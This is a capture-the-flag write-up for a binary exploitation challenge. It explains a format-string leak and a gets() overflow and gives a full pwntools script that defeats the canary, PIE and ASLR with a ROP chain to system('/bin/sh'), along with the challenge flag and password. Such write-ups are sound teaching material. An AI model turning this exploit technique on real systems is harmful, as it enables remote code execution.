# Intro to Pwning 3

For this challenge we are provided with an ELF binary `pwn2` and its source code `pwn2.c`. The binary has all mitigations enabled: full RELRO, stack canaries, NX and PIE. Analyzing the source code, we spot two bugs:

- In `welcome()`: stack smashing via `gets`

- In `welcome()`: user-controlled format string via `printf`

- In `AAAAAAAA()`: stack smashing via `gets`

Using the format string bug, we leak the address of the binary, the stack-canary and the address of libc off the stack. Then we smash the stack in `AAAAAAAA()` to overwrite its return address and execute a ROP chain. The ROP chain sets up the arguments for `system()` using the addresses we leaked and then returns to `system()`, spawning us a shell.

Flag: `CSCG{VOLDEMORT_DID_NOTHING_WRONG}`

Exploit code:

```python
from pwn import *

# connect
b = ELF("pwn3")
libc = ELF("libc.so.6")
context.binary = b
r = remote("hax1.allesctf.net", 9102)

# send password
r.sendlineafter("stage 2", "CSCG{NOW_GET_VOLDEMORT}")
r.recvuntil("witch name:")

# leak binary address, canary and libc address
r.sendline("%39$p %41$p %45$p")
leak = r.recvuntil("magic spell:")
canary, leak, leak_libc = leak.splitlines()[-1].split()[:3]
canary = int(canary, 0)
leak = int(leak, 0)
libc.address = int(leak_libc, 0) - 0x271E3
b.address = leak - 0xD7E
info("binary @ 0x%x", b.address)
info("canary: 0x%x", canary)
info("libc @ 0x%x", libc.address)

# gadgets used by rop chain
gadget_pop_rdi = b.address + 0xDF3
addr_binsh = next(libc.search("/bin/sh\0"))

# rop to system
r.sendline(
    "Expelliarmus".ljust(0x108, "\0")
    + flat(canary, 0, gadget_pop_rdi + 1, gadget_pop_rdi, addr_binsh, libc.symbols.system)
)
r.interactive()
```
